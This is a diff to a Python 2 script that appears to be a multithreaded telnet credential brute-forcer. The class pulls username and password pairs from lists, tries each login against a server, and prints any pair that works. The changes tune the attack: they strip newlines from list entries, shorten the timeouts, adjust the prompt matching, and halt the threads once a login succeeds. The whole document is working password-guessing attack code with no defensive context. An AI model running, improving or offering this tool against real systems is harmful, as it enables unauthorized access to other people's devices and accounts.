@@ -53,31 +53,37 @@ class telnetlibs:
 		lock.release()
 		return self.users[self.users_index-1],self.password[self.password_index]
 
-
 	def thread_handle(self,user,pwd):
 		try:
-			#print user,pwd
-			tn=telnetlib.Telnet(self.server,timeout=5)
-			tn.read_until("Username:")
+			print user,pwd
+			user=user.strip("\n")
+			user=user.strip("\r")
+			pwd=pwd.strip("\n")
+			pwd=pwd.strip("\r")
+			time.sleep(1)
+			tn=telnetlib.Telnet(self.server,timeout=1)
+			tn.read_until("Username: ")
 			tn.write(user+"\n")
-			tn.read_until("Password:")
+			tn.read_until("Password: ")
 			tn.write(pwd+"\n")
-			for i in range(1,3):
-				tn.write("exit\n")
+			#for i in range(1,1):
+				#tn.write("exit"+"\n")
 			#time.sleep(3)
-			ans=tn.read_all()
+			ans=tn.read_some()
+			tn.write("exit"+"\n")
+			tn.close()
 			print ans
-			print ans.find("invalid")
+			#print ans.find("invalid")
 			if ans.find("invalid")!=-1:
 				print "login fail"
 				#pass
 			else:
 				print "login success"
-				print "username: "+user+"\t"+"password"+pwd+"\n"
+				print "username: "+user+"\n"+"password: "+pwd+"\n"
 				self.isfind=True
 				return
 		except Exception as e:
-			#print e
+			print "[-]Exception:  %s" % e
 			if str(e)=="timed out":
 				#print "login failed"
 				pass
@@ -93,7 +99,11 @@ class telnetlibs:
 			user,pwd=self.getword()
 			#print user,pwd
 			th=threading.Thread(target=self.thread_handle,args=(user,pwd,))
+			if self.isfind==True:
+				return
 			th.start()
+			#th.join()
+
 
 
 
